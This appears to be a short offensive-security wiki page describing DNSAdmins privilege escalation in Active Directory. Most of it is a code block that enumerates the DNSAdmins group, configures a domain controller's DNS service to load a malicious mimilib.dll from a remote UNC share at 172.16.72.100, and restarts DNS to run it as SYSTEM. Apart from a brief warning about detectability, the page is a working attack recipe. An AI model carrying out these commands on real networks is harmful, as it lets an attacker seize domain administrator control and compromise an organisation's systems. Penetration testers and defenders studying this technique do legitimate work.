# DNS Admins

Using DNS Admins for privilege escalation in Active Directory with PowerView and Mimikatz. The technique abuses the privileges given by default to the members of the DNS Admins group.

{% hint style="warning" %}
This technique is very risky and easily detectable as it requires a restart in DNS service.&#x20;
{% endhint %}

### <mark style="color:orange;">Conditions</mark>

* **Members of the DNS Admins group can load arbitrary DLL’s with the privileges of dns.exe (SYSTEM)**
* **If the DC serves as DNS server, we can escalate to DA**
* **But: need to be able to restart the DNS on the DC !!!**

### <mark style="color:orange;">Exploitation</mark>

The attack vector consists of injecting a malicious DLL into the DNS process running as a System to escalate when the service restarts.

```
# Enumerate members of DNSAdmins group
# Using PowerView 3.0
Get-DomainGroupMember "DNSAdmins"

# Using AD Module
Get-ADGroupMember -Identity "DNSAdmins"

# With privileges of DNSAdmins member, e.g. through PTH, configure DLL
# Using dnscmd.exe (needs RSAT DNS)
dnscmd dcorp-dc /config /serverlevelplugindll \\172.16.72.100\dll\mimilib.dll

# Using DNSServer module (needds RSAT DNS)
$dnsettings = Get-DNSServerSetting -ComputerName dcorp-dc -Verbose -All
$dnsettings.ServerLevelPluginDll = "\\172.16.72.100\dll\mimilib.dll"
Set-DnsServerSetting -InputObject $dnsettings -ComputerName dcorp-dc -Verbose

# Restart DNS service
sc \\dcorp-dc stop dns
sc \\dcorp-dc start dns
```

